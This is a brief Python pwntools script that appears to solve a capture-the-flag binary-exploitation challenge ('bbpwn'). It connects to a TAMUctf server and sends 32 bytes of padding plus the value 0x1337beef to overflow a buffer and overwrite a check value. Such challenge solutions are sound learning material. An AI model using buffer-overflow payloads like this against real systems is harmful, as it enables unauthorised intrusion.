from pwn import *

#process = process("./bbpwn")
process = remote("challenges.tamuctf.com", 4252)

padding = "A"*0x20
payload = p32(0x1337beef)

print process.recv()
process.sendline(padding+payload)
print process.recvall()
